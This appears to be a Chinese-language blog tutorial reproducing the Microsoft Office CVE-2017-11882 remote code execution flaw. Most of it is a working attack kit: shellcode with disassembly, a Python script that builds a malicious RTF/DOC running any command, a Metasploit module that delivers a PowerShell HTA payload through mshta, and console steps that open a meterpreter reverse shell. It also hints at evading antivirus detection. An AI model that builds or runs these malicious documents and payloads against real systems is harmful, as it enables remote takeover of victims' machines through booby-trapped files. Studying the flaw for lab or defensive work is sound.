
```text
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\par}
```

```text
#0: b8 44 eb 71 12 mov eax,0x1271eb44
#5: ba 78 56 34 12 mov edx,0x12345678
#a: 31 d0 xor eax,edx
#c: 8b 08 mov ecx,DWORD PTR [eax]
#e: 8b 09 mov ecx,DWORD PTR [ecx]
#10: 8b 09 mov ecx,DWORD PTR [ecx]
#12: 66 83 c1 3c add cx,0x3c
#16: 31 db xor ebx,ebx
#18: 53 push ebx
#19: 51 push ecx
#1a: be 64 3e 72 12 mov esi,0x12723e64
#1f: 31 d6 xor esi,edx
#21: ff 16 call DWORD PTR [esi] // call WinExec
#23: 53 push ebx
#24: 66 83 ee 4c sub si,0x4c
#28: ff 10 call DWORD PTR [eax] // call ExitProcess
```

```python
stage1="\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10"

# pads with nop

stage1=stage1.ljust(44,'\x90')

def genrtf(cmd,r_head):
    if len(cmd) > 109:
        print "[!] Primitive command must be shorter than 109 bytes"
        sys.exit(0)

    payload='\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ'

    payload+=stage1
    payload+=pack('<I',0x00402114) # ret
    payload+='\x00'*2
    payload+=cmd
    payload=payload.ljust(197,'\x00')

    return r_head+objclass+payload.encode('hex')+tail

def getrheader(file):
    input_file = open(file,"r").read()
    r_header = input_file.split("{\\*\datastore")[0]
    return r_header

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="PoC for CVE-2017-11882")
    parser.add_argument("-c", "--cmd", help="Command run in target system", required=True)
    parser.add_argument('-o', "--output", help="Output exploit rtf", required=True)
    parser.add_argument("-i", "--input", help="Input normal rtf.", required=False)
    args = parser.parse_args()

    if args.input != None:
        r_header = getrheader(args.input)
    else:
        r_header = head

    with open(args.output,'wb') as f:
        f.write(genrtf(args.cmd,r_header))

    f.close()
    print "[*] Done ! output file --> " + args.output
```

## 利用工具

- Windows 7
- Office 2013
- Metasploit

## 利用过程

打开上面的`Command43b_CVE-2017-11882.py`脚本，测试一下 DOC 文件。

使用命令如下：

```bash
python Command43b_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o cve.doc
```

使用这条命令后会在目录里生成一个名为`cve.doc`的 doc 文件，拿到 Windows 7 靶机去打开看看效果。

![图片描述](upload/attach/201902/3_UVB8X3A298BKAHQ.png)

Windows 7 打开恶意 doc 文件后，系统调用的计算器已经弹出，证明该 POC 是可行的。

（为什么要弹计算器……这个梗已经被众多黑客玩烂了。。）

## MSF 进行漏洞利用

现在就需要一个 rb 脚本来和 MSF 进行交互，具体操作如下：

首先需要在 MSF 里添加这个脚本，如果 MSF 没有作改动，路径应该是`/usr/share/metasploit-framework/modules/exploits/windows`，可以在这目录下新建一个文件夹。

将下面的脚本写入到`PS_shell.rb`。

```ruby
# This module requires Metasploit: <mark class="encrypted">0c6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6i4c8S2M7%4m8D9L8$3W2@1i4K6u0W2j5$3!0E0i4K6u0r3k6r3!0%4L8X3I4G2j5h3b7`.</mark>

# Current source: <mark class="encrypted">e5aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5j5i4m8A6k6o6N6Q4x3V1k6E0k6i4c8S2M7%4m8D9L8$3W2@1i4K6u0V1k6Y4u0S2L8h3g2%4L8%4u0C8</mark>

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Microsoft Office Payload Delivery',

      'Description' => %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },

      'License' => MSF_LICENSE,
      'Arch' => ARCH_X86,
      'Platform' => 'win',
      'Targets' =>
        [
          ['Automatic', {} ],
        ],

      'DefaultTarget' => 0,
    ))
  end

  def on_request_uri(cli, _request)
    print_status("Delivering payload")
    p = regenerate_payload(cli)

    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      'win',
      p.encoded,
      'hta-psh',
      { :arch => ARCH_X86, :platform => 'win '}
    )

    send_response(cli, data, 'Content-Type' => 'application/hta')
  end

  def primer
    url = get_uri
    print_status("Place the following DDE in an MS document:")
    print_line("mshta.exe \"#{url}\"")
  end
end
```

**打开 MSF 后，搜搜漏洞利用模块。**

```text
msf > PS_shell
```

![图片描述](upload/attach/201902/3_JSP2VTQ6USBNZ98.png)

**使用该模块**

```text
msf > use exploit/windows/CVE-2017-11882/PS_shell
```

![enter image description here](upload/attach/202002/784203_4BN6K3NFT4EP77B.jpg)

上图的操作过程如下：

```text
msf exploit(PS_shell) > set payload windows/meterpreter/reverse_tcp //设置payload为反弹TCP连接
payload => windows/meterpreter/reverse_tcp

msf exploit(PS_shell) > set lhost 192.168.30.128 //设置本机IP
lhost => 172.16.253.76

msf exploit(PS_shell) > set URIPATH test //设置URI地址
URIPATH => abc

msf exploit(PS_shell) > show options //检查配置

Module options (exploit/windows/CVE-2017-11882/PS_shell):

Name Current Setting Required Description
---- --------------- -------- -----------

SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0

SRVPORT 8080 yes The local port to listen on.

SSL false no Negotiate SSL for incoming connections

SSLCert no Path to a custom SSL certificate (default is randomly generated)

URIPATH test no The URI to use for this exploit (default is random)

Payload options (windows/meterpreter/reverse_tcp):

Name Current Setting Required Description
---- --------------- -------- -----------

EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)

LHOST 192.168.30.128 yes The listen address

LPORT 4444 yes The listen port

Exploit target:

Id Name
-- ----

0 Automatic
```

配置无误后即可执行，执行后 MSF 会监听本地 8080 端口，如果机器打开 doc 就会触发，反弹 shell 建立会话。

```text
msf exploit(PS_shell) > exploit -j

[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.30.128:4444

msf exploit(PS_shell) > [*] Using URL: <mark class="encrypted">66bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0m8Q4x3X3f1H3i4K6u0W2x3q4)9J5k6e0m8Q4x3@1p5^5x3o6R3H3i4K6u0r3N6r3g2K6N6l9`.`.</mark>

[*] Local IP: <mark class="encrypted">3a2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0x3H3i4K6u0W2x3e0t1^5i4K6y4m8z5o6l9^5x3q4)9J5c8Y4c8W2M7%4b7`.</mark>

[*] Server started.

[*] Place the following DDE in an MS document:

mshta.exe "<mark class="encrypted">7c1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0x3H3i4K6u0W2x3e0t1^5i4K6y4m8z5o6l9^5x3q4)9J5c8Y4c8W2M7%4b7`.</mark>"
```

此时这个 test 显然不是一份 doc 格式的文件，我们需要用到刚刚用的 py 脚本文件，生成一份恶意的 doc 文件。

## 生成恶意 doc 文件

![图片描述](upload/attach/201902/3_CRHE8V3FWFCYRWS.png)

这个时候，拿`test1.doc`文件到 Windows 7 去打开试试。

![图片描述](upload/attach/201902/3_W82CDMCQUQAK2Y8.png)

## Windows 7 打开效果

![图片描述](upload/attach/201902/3_W7TFHNGUF5NBUWV.png)

## MSF 监听效果

![图片描述](upload/attach/201902/3_8JBWURGGZSG9PU3.png)

可以看到 MSF 已经和 Windows 7 建立起了连接。

此种攻击方式是利用的 PowerShell 反弹，打开恶意 doc 文档的时候会一闪而逝的“PowerShell”窗口。

## `net user`

![图片描述](upload/attach/201902/3_JY5PURDTGC5S4HV.png)

到此漏洞复现完成。说点其他的，现在的攻击方式可不止 EXE 文件这种方式。

样本文件 360 会扫描识别到并且拦截，因为调用了 PowerShell，类似于恶意动作，360 会报警。

但是可以用免杀处理一下，至于怎么处理，就看各位的功夫了。

一般人不会想到恶意 doc 文档攻击，尽量小心陌生人发来的东西，可能不止是 EXE 文件，doc 也可能会充满恶意。

## 直接贴本地复现过程

2017 年 11 月 14 日，微软发布了 11 月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏 17 年之久的 Office 远程代码执行漏洞（CVE-2017-11882）。该漏洞为 Office 内存破坏漏洞，影响目前流行的所有 Office 版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11 月 19 日，监控到了已有漏洞 POC 在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。

```text
漏洞影响版本：

Office 365

Microsoft Office 2000

Microsoft Office 2003

Microsoft Office 2007 Service Pack 3

Microsoft Office 2010 Service Pack 2

Microsoft Office 2013 Service Pack 1

Microsoft Office 2016
```

等于说，影响现在主流的 Office 版本，基本可以做到通杀。

这里我给出两个 POC。

```text
844K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6W2L8h3u0W2k6r3W2Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5%4i4K6u0V1x3e0p5^5z5o6t1`. //国外黑客所写

22eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6d9K9h3c8@1k6i4u0Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5%4i4K6u0V1x3e0p5^5z5o6t1`. //国内黑客所写
```

两个 POC 的代码我也贴上。
